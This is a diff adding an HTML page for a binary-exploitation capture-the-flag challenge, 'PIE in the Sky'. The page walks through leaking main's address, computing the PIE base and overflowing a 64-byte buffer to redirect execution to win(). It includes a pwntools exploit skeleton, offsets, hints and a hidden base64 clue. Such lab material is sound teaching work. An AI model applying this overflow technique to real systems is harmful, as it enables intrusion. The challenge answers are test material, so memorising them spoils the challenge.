@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>FlagVault CTF — PIE in the Sky</title>
+  <link rel="stylesheet" href="style.css" />
+  <!-- hidden: base64("pie_bypass_master") = cGllX2J5cGFzc19tYXN0ZXI= -->
+</head>
+<body>
+
+<!-- ─── NAV ─── -->
+<nav class="nav">
+  <a class="nav-brand" href="#">
+    <span class="bracket">[</span>
+    <span class="brand-flag">FLAG</span>VAULT
+    <span class="bracket">]</span>
+  </a>
+  <ul class="nav-links">
+    <li><a href="#">Home</a></li>
+    <li><a href="#" class="active">Challenges</a></li>
+    <li><a href="#">Scoreboard</a></li>
+    <li><a href="#">Rules</a></li>
+  </ul>
+  <div class="nav-status">
+    <div class="status-dot"></div>
+    <span>LIVE</span>
+  </div>
+</nav>
+
+<!-- ─── PAGE WRAP ─── -->
+<div class="page-wrap">
+
+  <!-- HEADER -->
+  <div class="page-header" data-index="PWN">
+    <p class="page-eyebrow">// BINARY EXPLOITATION — PWN</p>
+    <h1 class="page-title">
+      <span class="hl">PIE</span> in the <span class="hl2">Sky</span>
+    </h1>
+    <p class="page-desc">Category: Binary Exploitation &nbsp;|&nbsp; Points: 400 &nbsp;|&nbsp; Difficulty: Hard</p>
+  </div>
+
+  <!-- STATS STRIP -->
+  <div class="stats-strip">
+    <div class="stat-box">
+      <span class="stat-val">400</span>
+      <span class="stat-label">Points</span>
+    </div>
+    <div class="stat-box">
+      <span class="stat-val red">21</span>
+      <span class="stat-label">Solves</span>
+    </div>
+    <div class="stat-box">
+      <span class="stat-val amber">3</span>
+      <span class="stat-label">Hints</span>
+    </div>
+    <div class="stat-box">
+      <span class="stat-val green">PIE</span>
+      <span class="stat-label">Mitigation</span>
+    </div>
+    <div class="stat-box">
+      <span class="stat-val ornge">x64</span>
+      <span class="stat-label">Arch</span>
+    </div>
+  </div>
+
+  <!-- ── MAIN TWO-COLUMN LAYOUT ── -->
+  <div style="display:grid;grid-template-columns:1fr 360px;gap:2rem;" id="main-layout">
+
+    <!-- LEFT: CHALLENGE CONTENT -->
+    <div>
+
+      <!-- DESCRIPTION -->
+      <div class="sec-divider"><h3>Challenge Description</h3></div>
+
+      <div class="ch-desc">
+        This binary has <strong style="color:var(--accent)">PIE enabled</strong>. You can't rely on static addresses anymore.<br><br>
+        Leak a function address first, calculate the base, then redirect execution to <code>win()</code>.<br><br>
+        <code>nc challenge.flagvault.local 9005</code>
+      </div>
+
+      <!-- BINARY PROPERTIES -->
+      <div class="sec-divider"><h3>Binary Properties</h3></div>
+
+      <div style="background:var(--surface2);border:1px solid var(--border);padding:1.2rem 1.5rem;margin-bottom:1.5rem;font-family:var(--font-mono);font-size:0.82rem;display:flex;flex-wrap:wrap;gap:0.75rem;">
+        <span class="tag tag-red">PIE: Enabled</span>
+        <span class="tag tag-red">NX: Enabled</span>
+        <span class="tag tag-green">Canary: None</span>
+        <span class="tag tag-amber">RELRO: Partial</span>
+        <span class="tag tag-purple">Arch: x86-64</span>
+        <span class="tag tag-green">File: ELF 64-bit LSB</span>
+      </div>
+
+      <!-- TERMINAL: BINARY INFO -->
+      <div class="sec-divider"><h3>Binary Analysis — GDB Session</h3></div>
+
+      <div id="terminal-box" style="background:#030a0f;border:1px solid var(--border);border-radius:var(--radius);padding:0;overflow:hidden;margin-bottom:2rem;">
+        <div style="background:var(--surface2);border-bottom:1px solid var(--border);padding:0.5rem 1rem;display:flex;align-items:center;gap:0.5rem;">
+          <span style="width:10px;height:10px;border-radius:50%;background:#ff5f57;display:inline-block;"></span>
+          <span style="width:10px;height:10px;border-radius:50%;background:#febc2e;display:inline-block;"></span>
+          <span style="width:10px;height:10px;border-radius:50%;background:#28c840;display:inline-block;"></span>
+          <span style="font-family:var(--font-mono);font-size:0.65rem;color:var(--text-dim);margin-left:0.5rem;">gdb ./pie_sky</span>
+        </div>
+        <div id="terminal-output" style="padding:1.2rem 1.4rem;font-family:var(--font-mono);font-size:0.78rem;line-height:2;color:var(--text);min-height:280px;"></div>
+      </div>
+
+      <!-- MEMORY MAP -->
+      <div class="sec-divider"><h3>Memory Map (ASLR in Action)</h3></div>
+
+      <div id="memmap-wrap" style="background:var(--surface2);border:1px solid var(--border);padding:1.2rem 1.4rem;font-family:var(--font-mono);font-size:0.75rem;line-height:1.9;margin-bottom:2rem;">
+        <div style="color:var(--text-dim);font-size:0.62rem;letter-spacing:2px;margin-bottom:0.7rem;">// /proc/&lt;pid&gt;/maps — randomized each run</div>
+        <div id="memmap-lines"></div>
+        <div style="margin-top:0.8rem;">
+          <button onclick="rerollMemmap()" class="btn btn-danger" style="font-size:0.6rem;padding:0.45rem 1rem;letter-spacing:2px;">↺ REROLL ASLR</button>
+          <span style="color:var(--text-dim);font-size:0.68rem;margin-left:1rem;">base changes every execution</span>
+        </div>
+      </div>
+
+      <!-- EXPLOIT CONCEPT -->
+      <div class="sec-divider"><h3>Exploit Walkthrough</h3></div>
+
+      <div class="challenges-list">
+
+        <div class="challenge-card" id="step1">
+          <div class="ch-header" onclick="toggleStep('step1')">
+            <span class="ch-id">01</span>
+            <span class="ch-difficulty diff-medium">Step 1</span>
+            <span class="ch-title">Leak a libc/binary address from the output</span>
+            <span class="ch-toggle">▼</span>
+          </div>
+          <div class="ch-body">
+            <div class="ch-desc">
+              The binary calls <code>printf("%p\n", main)</code> before reading your input — leaking the runtime address of <code>main</code>.<br><br>
+              Capture this value. It's your anchor into the binary's randomised address space.
+            </div>
+            <div id="leak-demo" style="background:#030a0f;border:1px solid var(--border);padding:1rem 1.2rem;font-family:var(--font-mono);font-size:0.78rem;margin-top:0.5rem;">
+              <span style="color:var(--accent2)">$ </span><span style="color:var(--text)">nc challenge.flagvault.local 9005</span><br>
+              <span style="color:var(--text-dim)">[*] Leak: </span><span id="leaked-addr" style="color:var(--accent)">0x55f3a4821269</span><br>
+              <span style="color:var(--text-dim)">[*] Enter your payload: </span>
+            </div>
+          </div>
+        </div>
+
+        <div class="challenge-card" id="step2">
+          <div class="ch-header" onclick="toggleStep('step2')">
+            <span class="ch-id">02</span>
+            <span class="ch-difficulty diff-hard">Step 2</span>
+            <span class="ch-title">Calculate the PIE base address</span>
+            <span class="ch-toggle">▼</span>
+          </div>
+          <div class="ch-body">
+            <div class="ch-desc">
+              With the leaked <code>main</code> address and the known static offset from GDB (<code>0x1269</code>), compute the base:<br><br>
+              <code style="display:block;padding:0.8rem;margin-top:0.5rem;font-size:0.85em;">base = leaked_main − 0x1269</code>
+            </div>
+            <!-- Interactive PIE calculator -->
+            <div style="margin-top:1rem;background:var(--surface2);border:1px solid var(--border);padding:1rem 1.2rem;">
+              <div style="font-family:var(--font-mono);font-size:0.65rem;letter-spacing:2px;color:var(--text-dim);margin-bottom:0.7rem;">// INTERACTIVE BASE CALCULATOR</div>
+              <div class="form-row" style="margin-bottom:0.8rem;">
+                <div class="form-group">
+                  <label>Leaked main() address (hex)</label>
+                  <input id="calc-leaked" class="form-control" placeholder="0x55f3a4821269" oninput="calcBase()" />
+                </div>
+                <div class="form-group">
+                  <label>main() static offset (from GDB)</label>
+                  <input id="calc-offset" class="form-control" value="0x1269" oninput="calcBase()" />
+                </div>
+              </div>
+              <div style="font-family:var(--font-mono);font-size:0.82rem;color:var(--text-dim);">
+                PIE Base: <span id="calc-result" style="color:var(--accent)">—</span>
+              </div>
+              <div style="font-family:var(--font-mono);font-size:0.82rem;color:var(--text-dim);margin-top:0.4rem;">
+                win() address: <span id="calc-win" style="color:var(--accent2)">—</span>
+                <span style="font-size:0.65rem;color:var(--text-dim);"> (base + 0x11e9)</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="challenge-card" id="step3">
+          <div class="ch-header" onclick="toggleStep('step3')">
+            <span class="ch-id">03</span>
+            <span class="ch-difficulty diff-hard">Step 3</span>
+            <span class="ch-title">Overflow the buffer & overwrite RIP</span>
+            <span class="ch-toggle">▼</span>
+          </div>
+          <div class="ch-body">
+            <div class="ch-desc">
+              The buffer is <code>64 bytes</code>. The saved RIP sits at offset <code>72</code> (64 + 8-byte SFP).<br>
+              No canary → overflow freely. Overwrite RIP with the calculated <code>win()</code> address.
+            </div>
+            <div style="background:#030a0f;border:1px solid var(--border);padding:1rem 1.2rem;font-family:var(--font-mono);font-size:0.76rem;line-height:1.9;margin-top:0.8rem;">
+              <span style="color:var(--accent2)"># Python exploit skeleton</span><br>
+              <span style="color:var(--text-dim)">from pwn import *</span><br><br>
+              <span style="color:var(--accent)">r = remote('challenge.flagvault.local', 9005)</span><br>
+              <span style="color:var(--text-dim)">leak = int(r.recvline_contains(b'Leak').split()[-1], 16)</span><br>
+              <span style="color:var(--text-dim)">base = leak - 0x1269</span><br>
+              <span style="color:var(--text-dim)">win  = base + 0x11e9</span><br><br>
+              <span style="color:var(--accent3)">payload = b'A' * 72 + p64(win)</span><br>
+              <span style="color:var(--text-dim)">r.sendline(payload)</span><br>
+              <span style="color:var(--text-dim)">r.interactive()</span>
+            </div>
+          </div>
+        </div>
+
+      </div><!-- /challenges-list -->
+
+      <!-- HINTS -->
+      <div class="sec-divider"><h3>Hints</h3></div>
+
+      <div class="hints-container">
+        <div class="hint-item" id="hint1">
+          <button class="hint-toggle" onclick="revealHint('hint1')">
+            <span class="hint-num">HINT 01</span>
+            The leak is printed before input — read it, don't ignore it.
+            <span class="hint-cost">−0 pts</span>
+          </button>
+          <div class="hint-content">
+            Run <code>nc challenge.flagvault.local 9005</code> and capture the very first line of output. It contains <code>main</code>'s runtime address in hex format.
+          </div>
+        </div>
+        <div class="hint-item" id="hint2">
+          <button class="hint-toggle" onclick="revealHint('hint2')">
+            <span class="hint-num">HINT 02</span>
+            Where is win() relative to main?
+            <span class="hint-cost">−25 pts</span>
+          </button>
+          <div class="hint-content">
+            In GDB: <code>p win - main</code> → <code>-0x80</code>. Or check <code>objdump -d</code>: <code>win</code> is at offset <code>0x11e9</code>, <code>main</code> at <code>0x1269</code>.
+          </div>
+        </div>
+        <div class="hint-item" id="hint3">
+          <button class="hint-toggle" onclick="revealHint('hint3')">
+            <span class="hint-num">HINT 03</span>
+            How many bytes until RIP?
+            <span class="hint-cost">−50 pts</span>
+          </button>
+          <div class="hint-content">
+            Use <code>cyclic 100</code> in pwntools, send, check the crash offset. You'll find it's <strong>72 bytes</strong> (64 buffer + 8 saved RBP).
+          </div>
+        </div>
+      </div>
+
+      <!-- FLAG FORMAT -->
+      <div class="flag-format">
+        <span class="flag-icon">🚩</span>
+        <div>Flag format: <strong>FlagVault{your_flag_here}</strong></div>
+      </div>
+
+    </div><!-- /left col -->
+
+    <!-- RIGHT: SIDEBAR -->
+    <div>
+
+      <!-- CHALLENGE INFO CARD -->
+      <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:1.5rem;margin-bottom:1.5rem;">
+        <div style="font-family:var(--font-mono);font-size:0.62rem;letter-spacing:3px;color:var(--text-dim);text-transform:uppercase;margin-bottom:1rem;">Challenge Info</div>
+        <table style="width:100%;font-family:var(--font-mono);font-size:0.75rem;border-collapse:collapse;">
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="color:var(--text-dim);padding:0.5rem 0;">Category</td>
+            <td style="color:var(--text-hi);text-align:right;">Binary Exploitation</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="color:var(--text-dim);padding:0.5rem 0;">Points</td>
+            <td style="color:var(--accent3);text-align:right;">400</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="color:var(--text-dim);padding:0.5rem 0;">Difficulty</td>
+            <td style="text-align:right;"><span class="tag tag-red">Hard</span></td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="color:var(--text-dim);padding:0.5rem 0;">Host</td>
+            <td style="color:var(--accent);text-align:right;font-size:0.68rem;">challenge.flagvault.local</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="color:var(--text-dim);padding:0.5rem 0;">Port</td>
+            <td style="color:var(--accent);text-align:right;">9005</td>
+          </tr>
+          <tr>
+            <td style="color:var(--text-dim);padding:0.5rem 0;">Solves</td>
+            <td style="color:var(--accent2);text-align:right;">21</td>
+          </tr>
+        </table>
+      </div>
+
+      <!-- TOOLS CARD -->
+      <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:1.5rem;margin-bottom:1.5rem;">
+        <div style="font-family:var(--font-mono);font-size:0.62rem;letter-spacing:3px;color:var(--text-dim);text-transform:uppercase;margin-bottom:1rem;">Recommended Tools</div>
+        <div class="tools-grid" style="grid-template-columns:1fr 1fr;">
+          <div class="tool-card" style="--tool-color:var(--accent);">
+            <span class="tool-icon">🐧</span>
+            <div class="tool-name">pwntools</div>
+            <span class="tool-tag">Python</span>
+            <div class="tool-desc">Exploit framework</div>
+          </div>
+          <div class="tool-card" style="--tool-color:var(--accent3);">
+            <span class="tool-icon">🔍</span>
+            <div class="tool-name">GDB + peda</div>
+            <span class="tool-tag">Debugger</span>
+            <div class="tool-desc">Find offsets</div>
+          </div>
+          <div class="tool-card" style="--tool-color:var(--accent2);">
+            <span class="tool-icon">📦</span>
+            <div class="tool-name">checksec</div>
+            <span class="tool-tag">Analysis</span>
+            <div class="tool-desc">Check mitigations</div>
+          </div>
+          <div class="tool-card" style="--tool-color:var(--accent4);">
+            <span class="tool-icon">🗺️</span>
+            <div class="tool-name">objdump</div>
+            <span class="tool-tag">Disasm</span>
+            <div class="tool-desc">Find offsets</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- RECENT SOLVERS -->
+      <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;">
+        <div style="padding:1rem 1.2rem;border-bottom:1px solid var(--border);font-family:var(--font-mono);font-size:0.62rem;letter-spacing:3px;color:var(--text-dim);text-transform:uppercase;">Recent Solvers</div>
+        <div id="solvers-list"></div>
+      </div>
+
+    </div><!-- /right sidebar -->
+  </div><!-- /main-layout -->
+
+  <!-- SUBMIT FLAG SECTION -->
+  <div class="submit-section">
+    <div class="submit-title">Submit Your Flag</div>
+    <p class="submit-sub">Obtained the flag from the remote server? Enter it below.</p>
+
+    <div class="form-row">
+      <div class="form-group">
+        <label>Team / Username</label>
+        <input id="inp-user" class="form-control" placeholder="h4ck3r_h0use" />
+      </div>
+      <div class="form-group">
+        <label>Challenge</label>
+        <select class="form-control">
+          <option>PIE in the Sky — Binary Exploitation</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="form-group flag-input-wrap">
+      <span class="prefix">FlagVault{</span>
+      <input id="flag-input" class="form-control" placeholder="your_flag_here}" style="padding-left:7.8rem;" />
+    </div>
+
+    <button class="btn btn-primary" onclick="submitFlag()">⚑ &nbsp;SUBMIT FLAG</button>
+    <div class="submit-result" id="flag-result"></div>
+  </div>
+
+</div><!-- /page-wrap -->
+
+<!-- FOOTER -->
+<footer class="footer">
+  <div class="footer-brand">FLAG<span>VAULT</span> CTF</div>
+  <div class="footer-copy">© 2025 FlagVault &nbsp;|&nbsp; Binary Exploitation Track &nbsp;|&nbsp; PIE in the Sky</div>
+</footer>
+
+<script src="script.js"></script>
+</body>
+</html>
